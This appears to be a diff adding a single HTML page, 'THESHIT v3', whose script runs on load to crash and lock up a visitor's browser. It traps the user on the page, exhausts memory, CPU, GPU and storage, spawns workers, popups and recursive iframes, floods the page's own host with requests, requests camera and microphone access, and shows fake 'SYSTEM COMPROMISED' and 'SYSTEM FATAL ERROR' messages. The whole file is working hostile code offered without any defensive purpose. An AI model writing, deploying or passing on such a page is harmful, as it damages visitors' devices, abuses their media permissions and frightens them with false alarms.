@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>THESHIT v3</title>
+<script>
+window.addEventListener('beforeunload', (e) => {
+    e.preventDefault();
+    e.returnValue = '';
+    setTimeout(() => window.open(location.href, '_self'), 0);
+});
+document.oncontextmenu = document.onkeydown = document.onmousedown = () => false;
+
+function stackMemoryCrash(depth = 0) {
+    if (depth > 10000) return;
+    try {
+        let hugeArray = new Array(1000000).fill({data: new ArrayBuffer(100000)});
+        let hugeString = 'A'.repeat(1000000) + depth + 'B'.repeat(1000000);
+        document.body.innerHTML += hugeString;
+        stackMemoryCrash(depth + 1);
+        stackMemoryCrash(depth + 1);
+    } catch(e) {
+        stackMemoryCrash(0);
+    }
+}
+
+function hyperWorkerNuke() {
+    if (typeof Worker !== 'undefined') {
+        const workerBlob = new Blob([
+            `for(let i=0;i<10;i++) {
+                setInterval(() => {
+                    let a = [];
+                    for(let j=0;j<100000;j++) a.push(new Float64Array(10000));
+                    postMessage(a);
+                }, 1);
+            }`
+        ], {type: 'application/javascript'});
+        const workerURL = URL.createObjectURL(workerBlob);
+        for (let i = 0; i < 100; i++) {
+            try {
+                new Worker(workerURL);
+            } catch(e) {}
+        }
+    }
+}
+
+function totalStorageOverkill() {
+    setInterval(() => {
+        let giantData = 'G'.repeat(5 * 1024 * 1024);
+        for (let i = 0; i < 100; i++) {
+            try {
+                localStorage.setItem('bomb_' + i, giantData);
+                sessionStorage.setItem('bomb_' + i, giantData);
+            } catch(e) {}
+        }
+        
+        let request = indexedDB.open('DoSDatabase', 1000000000);
+        request.onsuccess = function(e) {
+            let db = e.target.result;
+            let transaction = db.transaction(['store'], 'readwrite');
+            let store = transaction.objectStore('store');
+            for (let j = 0; j < 1000; j++) {
+                store.put({id: j, data: new ArrayBuffer(10000000)});
+            }
+        };
+        
+        document.cookie = 'crash=' + 'C'.repeat(4000) + '; path=/; max-age=31536000';
+    }, 100);
+}
+
+function infiniteModalTabHell() {
+    setInterval(() => {
+        try {
+            window.open('', '_blank', 'width=100,height=100,left='+Math.random()*1000+',top='+Math.random()*1000);
+            alert('SYSTEM COMPROMISED');
+            prompt('SYSTEM COMPROMISED');
+            confirm('SYSTEM COMPROMISED');
+        } catch(e) {}
+    }, 50);
+}
+
+function mediaApiBomb() {
+    navigator.mediaDevices.getUserMedia({video: true, audio: true})
+    .then(stream => {
+        let tracks = stream.getTracks();
+        let audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        let oscillator = audioContext.createOscillator();
+        oscillator.connect(audioContext.destination);
+        oscillator.start();
+        setInterval(() => {
+            tracks.forEach(track => track.enabled = !track.enabled);
+        }, 1);
+    })
+    .catch(e => {});
+}
+
+function networkFlood() {
+    setInterval(() => {
+        fetch(location.href).catch(e => {});
+        fetch('data:text/html,' + '<!'.repeat(1000000)).catch(e => {});
+        try {
+            let ws = new WebSocket('ws://' + location.host);
+            ws.onopen = () => ws.send('0'.repeat(10000000));
+        } catch(e) {}
+    }, 10);
+}
+
+function recursiveIframeHell(parent) {
+    for (let i = 0; i < 5; i++) {
+        let iframe = document.createElement('iframe');
+        iframe.srcdoc = '<script>parent.recursiveIframeHell(document.body)<\/script>';
+        parent.appendChild(iframe);
+    }
+}
+
+function gpuOverload() {
+    let canvas = document.createElement('canvas');
+    canvas.width = 9999;
+    canvas.height = 9999;
+    document.body.appendChild(canvas);
+    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+        setInterval(() => {
+            let buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000000), gl.STATIC_DRAW);
+        }, 1);
+    }
+    let ctx2d = canvas.getContext('2d');
+    setInterval(() => {
+        for (let i = 0; i < 100; i++) {
+            ctx2d.fillRect(Math.random()*9999, Math.random()*9999, 1000, 1000);
+        }
+    }, 1);
+}
+
+window.onload = function() {
+    stackMemoryCrash();
+    hyperWorkerNuke();
+    totalStorageOverkill();
+    infiniteModalTabHell();
+    mediaApiBomb();
+    networkFlood();
+    recursiveIframeHell(document.body);
+    gpuOverload();
+    
+
+    setInterval(() => {
+        document.body.innerHTML = '<h1 style="font-size:100px;color:red;">SYSTEM FATAL ERROR</h1>';
+        document.body.style.backgroundColor = 'black';
+        document.title = '💀 CRASHED 💀';
+        navigator.vibrate?.(1000);
+    }, 500);
+};
+</script>
+</head>
+<body style="background:black;color:lime;font-family:monospace;margin:0;padding:20px;">
+THESHIT <br/>
+THESHIT <br/>
+THESHIT <br/>
+</body>
+</html>
